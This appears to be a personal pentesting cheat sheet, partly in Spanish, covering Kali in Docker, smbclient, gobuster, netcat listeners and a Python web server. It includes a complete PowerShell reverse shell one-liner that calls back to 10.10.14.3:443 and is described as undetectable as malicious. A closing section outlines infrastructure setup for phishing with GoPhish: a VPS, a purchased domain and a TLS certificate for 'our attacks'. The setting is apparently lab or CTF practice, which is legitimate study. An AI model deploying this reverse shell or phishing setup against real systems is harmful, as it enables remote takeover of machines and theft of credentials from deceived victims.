# kali_docker
Manual para usar kali con docker en una maquina con servidor x11
```console
~$ docker run -it --cap-add NET_ADMIN  --privileged --net=host --env="DISPLAY" --volume="$XAUTHORITY:/root/.Xauthority:rw" -v $(pwd):/home kalilinux/kali-rolling
```
## Agregar un usuario no root
Dentro del contendor de kali
```console
~#adduser username
```
Y agregarlo a grupo sudo
```console
~# usermod -aG sudo username
``` 
Para tener una consola bonita usar el comando `su` con el argumento `-s /bin/bash`
```console
~# su -s /bin/bash username
```
Otra opción es modificar el archivo `etc/passwd` y modificar el shell por defecto del usuario 
```
username:x:1000:1000::/home/rodrigo:/bin/bash
```

## Uso de SMB Client

```console
smbclient  -N \\\\10.10.10.27\\carpeta -U rodrigo 
```
Once logged you can use `ls` command to list de diretories and `get` to copy a file to your local machine.

## Reverse Shell
In this link there is a ReverseShell CheatSheet

[Reverse Shell cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)


This is an example of a windows shell script that it's not detectable as malicious 
```shell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## cat - type
`type` is the windows equivalent linux `cat` command

## Quikly mount http server
Use the command
```console
python3 -m http.server 80
```
It will mount an http server listening on the port 80, and it  will serve any file in the current working directory

## explainshell.com

In the [explainshell.com](https://explainshell.com/) site you can input a command and it will discribe what it does.

## Port listener with netcat

Use netcat to setup a net listener:
```console
nc -lvnp 443
-l listen mode
-v verbose
-n numeric-only IP 
-p port 
```

## Gobuster

List directories of a web server. Use:
```console
gobuster dir -u 10.10.10.28  -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
That wordlist in the example is one of the wordlists that comes with the `dirbuster` command instalation.

# Phising with GoPhish
A TODO list needed in order to use GoPhish
- Get a server with a public IP address (you can use a VPS service like [digital ocean](https://www.digitalocean.com/) or [OVH](https://www.ovhcloud.com/en/vps/cheap-vps/) 
- Download the GoPhish code from its [git hub repository](https://github.com/gophish/gophish)
- Run de GoPhish server 

It is desirable that we don't use IP addresses in out attacks, it is better to have a domain, you can buy a domain in sites like [GoDaddy](https://www.godaddy.com/). Once we have a domain we need to get a certificate for it. There are sites like  [ZeroSSL](https://zerossl.com/) which can issue a certificate for FREE that ara valid for 90 Days. In order to proof that we have control of the domain ZeroSSL ask you to add some DNS register, we add this register in the DNS configuration of the domain provider.

